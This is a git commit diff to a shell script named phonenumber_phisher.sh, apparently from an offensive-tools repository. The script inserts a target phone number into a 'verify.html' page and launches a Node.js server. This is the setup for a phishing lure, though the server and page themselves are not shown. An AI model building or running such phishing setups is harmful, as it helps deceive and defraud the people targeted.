d8cfc5c0934a58d1f70455e88ccc01d9182bf80a
DemiGodVoid <162964001+DemiGodVoid@users.noreply.github.com>
2024-08-13 23:15:08 -0500

    Update phonenumber_phisher.sh

--- tools/phishers/phonenumber_phisher.sh
+++ tools/phishers/phonenumber_phisher.sh
@@ -6,12 +6,12 @@ read -p "Enter the phone number to send the message to: " phoneNumber
 # Escape special characters in the phone number (if any)
 escapedPhoneNumber=$(printf '%s' "$phoneNumber" | sed 's/[&/\]/\\&/g')
 
-# Update the phone number in the HTML file located in the test folder
+# Update the phone number in the HTML file located in the public folder
 sed -i "s/{{PHONE_NUMBER}}/$escapedPhoneNumber/" public/verify.html
 
 # Start the Node.js server in the background
 echo "Starting Node.js server..."
-node server4.js &
+node server.js &
 
 # Wait a bit to ensure the server starts
 sleep 2
